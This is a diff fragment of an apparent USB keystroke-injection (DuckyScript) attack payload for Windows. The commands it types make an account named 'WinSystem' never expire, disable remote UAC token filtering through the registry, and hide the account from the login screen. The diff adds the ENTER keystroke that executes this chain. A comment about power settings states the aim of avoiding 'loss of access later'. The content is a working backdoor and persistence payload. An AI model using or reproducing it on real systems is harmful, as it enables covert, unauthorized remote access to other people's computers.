@@ -23,7 +23,8 @@ DELAY 1500
 
 REM Set WinSystem user pass to never expire, skip UAC, and hide the user
 STRING wmic useraccount where name='WinSystem' set passwordexpires=false && REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 && REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v WinSystem /t REG_DWORD /d 0
-DELAY 500
+ENTER
+DELAY 1500
 
 REM Change power settings to avoid loss of access later (Hibernation, Standby, Disk Timeout)
 
